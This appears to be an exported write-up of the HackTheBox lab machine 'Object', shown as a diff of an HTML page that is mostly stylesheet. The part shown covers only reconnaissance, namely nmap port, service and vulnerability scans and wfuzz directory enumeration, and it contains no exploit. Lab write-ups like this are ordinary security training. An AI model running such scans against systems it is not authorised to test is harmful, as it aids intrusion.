@@ -1,0 +1,1428 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Object - 10.10.11.132</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="187d1b9f-8847-80d0-93ac-d49b859645db" class="page sans"><header><h1 class="page-title">Object - 10.10.11.132</h1><p class="page-description"></p></header><div class="page-body"><h1 id="187d1b9f-8847-81ad-9c0f-cbf142fd1497" class="">Information Gathering &amp; Enumeration</h1><p id="187d1b9f-8847-81fe-9468-e86f6b1262a4" class="">
+</p><h2 id="187d1b9f-8847-8108-bed7-dd3fbaa702f9" class="">Web</h2><figure id="187d1b9f-8847-80b4-aad1-c16eb523c60f" class="image"><a href="../img/Object/image.png"><img style="width:709.96875px" src="../img/Object/image.png"/></a></figure><figure id="187d1b9f-8847-80e2-ba28-e7d86c815a8c" class="image"><a href="../img/Object/image 1.png"><img style="width:709.96875px" src="../img/Object/image 1.png"/></a></figure><h2 id="187d1b9f-8847-8168-8830-ffd8c5da385a" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-81ba-8ad6-f70509789f10" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.11.132
+[sudo] password for drroot: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:01 -05
+Nmap scan report for 10.10.11.132
+Host is up (0.12s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+5985/tcp open  wsman
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-81ab-83e1-f196e1018c55" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -sVC -T5 -n 10.10.11.132 -p80,5985,8080
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:04 -05
+Nmap scan report for 10.10.11.132
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+|_http-title: Mega Engines
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8080/tcp open  http    Jetty 9.4.43.v20210629
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).
+|_http-server-header: Jetty(9.4.43.v20210629)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
+</code></pre><p id="187d1b9f-8847-814f-a991-fd2bf7c20535" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-81a2-886d-d760a3d65926" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap --script vuln 10.10.11.132 -p80,5985,8080
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:04 -05
+Nmap scan report for 10.10.11.132
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE
+80/tcp   open  http
+|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.
+5985/tcp open  wsman
+8080/tcp open  http-proxy
+| http-enum: 
+|_  /robots.txt: Robots file
+
+Nmap done: 1 IP address (1 host up) scanned in 348.28 seconds
+
+                                                                </code></pre><p id="187d1b9f-8847-806c-9531-d33aa2227cc1" class="">
+</p><h2 id="187d1b9f-8847-80e6-b948-e7ac9f1b5044" class="">Directory Enumeration</h2><h3 id="187d1b9f-8847-8038-ae22-ff044f00047e" class="">Port 80</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-807d-ad1a-efbc1342bd97" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://object.htb/FUZZ -t 50 --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000004255:   200        362 L    3419 W     29932 Ch    &quot;http://object.htb/&quot;                            
+
+Total time: 0
+Processed Requests: 29951
+Filtered Requests: 29950
+Requests/sec.: 0
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8025-aa0f-e963efcfb1ed" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://object.htb/FUZZ -t 50 --hc 404 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb/FUZZ
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000001:   200        362 L    3419 W     29932 Ch    &quot;# directory-list-2.3-medium.txt&quot;               
+000000014:   200        362 L    3419 W     29932 Ch    &quot;http://object.htb/&quot;                            
+000000013:   200        362 L    3419 W     29932 Ch    &quot;#&quot;                                             
+000000011:   200        362 L    3419 W     29932 Ch    &quot;# Priority ordered case-sensitive list, where e
+                                                        ntries were found&quot;                              
+000000007:   200        362 L    3419 W     29932 Ch    &quot;# license, visit http://creativecommons.org/lic
+                                                        enses/by-sa/3.0/&quot;                               
+000000010:   200        362 L    3419 W     29932 Ch    &quot;#&quot;                                             
+000000012:   200        362 L    3419 W     29932 Ch    &quot;# on at least 2 different hosts&quot;               
+000000003:   200        362 L    3419 W     29932 Ch    &quot;# Copyright 2007 James Fisher&quot;                 
+000000009:   200        362 L    3419 W     29932 Ch    &quot;# Suite 300, San Francisco, California, 94105, 
+                                                        USA.&quot;                                           
+000000005:   200        362 L    3419 W     29932 Ch    &quot;# This work is licensed under the Creative Comm
+                                                        ons&quot;                                            
+000000002:   200        362 L    3419 W     29932 Ch    &quot;#&quot;                                             
+000000008:   200        362 L    3419 W     29932 Ch    &quot;# or send a letter to Creative Commons, 171 Sec
+                                                        ond Street,&quot;                                    
+000000004:   200        362 L    3419 W     29932 Ch    &quot;#&quot;                                             
+000000006:   200        362 L    3419 W     29932 Ch    &quot;# Attribution-Share Alike 3.0 License. To view 
+                                                        a copy of this&quot;                                 
+000045240:   200        362 L    3419 W     29932 Ch    &quot;http://object.htb/&quot;                            
+
+Total time: 0
+Processed Requests: 220559
+Filtered Requests: 220544
+Requests/sec.: 0
+</code></pre><h3 id="187d1b9f-8847-8073-82d6-e328821c72d6" class="">Port 8080</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-808c-947e-c0267f019035" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://object.htb:8080/FUZZ -t 50 --hc 403
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb:8080/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000036:   302        0 L      0 W        0 Ch        &quot;logout&quot;                                        
+000000039:   200        10 L     109 W      2120 Ch     &quot;login&quot;                                         
+000000084:   302        0 L      0 W        0 Ch        &quot;assets&quot;                                        
+000000090:   400        8 L      203 W      6290 Ch     &quot;error&quot;                                         
+000000354:   404        16 L     29 W       451 Ch      &quot;WEB-INF&quot;                                       
+000000489:   200        82 L     399 W      7935 Ch     &quot;signup&quot;                                        
+000001248:   404        16 L     29 W       452 Ch      &quot;META-INF&quot;                                      
+000007074:   200        8 L      221 W      6551 Ch     &quot;oops&quot;                                          
